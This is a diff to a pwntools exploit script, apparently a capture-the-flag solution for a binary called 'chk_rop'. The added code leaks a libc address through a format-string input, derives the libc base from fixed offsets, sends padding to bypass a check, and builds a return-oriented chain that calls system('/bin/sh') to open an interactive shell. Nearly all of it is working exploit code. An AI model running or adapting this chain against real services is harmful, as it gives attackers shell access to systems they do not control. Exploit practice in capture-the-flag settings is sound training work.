@@ -6,7 +6,7 @@ from pwn import *
 
 local_file  = './chk_rop'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = local_libc # '../libc.so.6'
+remote_libc = '../../libc-2.23.so'
 
 is_local = False
 is_remote = False
@@ -48,22 +48,32 @@ def debug(cmd=''):
 # gadget
 prdi = 0x00000000004009d3 # pop rdi ; ret
 
-# elf, libc
-
-# rop1
-offset = 0
-payload = 'A'*offset
-payload += ''
-
+# leak libc
 ru('Give you a gift...\n')
+sl('%p'*3)
+
+data = ru('Tell me U filename\n')
+if is_remote:
+    libc_base = eval('0x'+data.split('0x')[2]) - 1012320
+if is_local:
+    libc_base = eval('0x'+data.split('0x')[2]) - 1101697
+info_addr('libc_base',libc_base)
+
+# debug('b *0x4008f0')
+
+# bypass chk 
+se('a'*16)
+
+# rop
+system = libc_base + libc.sym['system']
+binsh = libc_base + libc.search("/bin/sh").next()
+payload = 'a'*88
+if is_local:
+    payload += p64(0x04008F7) + p64(prdi) + p64(binsh) + p64(system)
+if is_remote:
+    payload += p64(prdi) + p64(binsh) + p64(system)
+
+ru('And the content:\n')
 sl(payload)
 
-log.hexdump(ru('Tell me U filename\n'))
-debug()
-sl('a'*14)
-
-# info_addr('tag',addr)
-# log.warning('--------------')
-
 p.interactive()
-
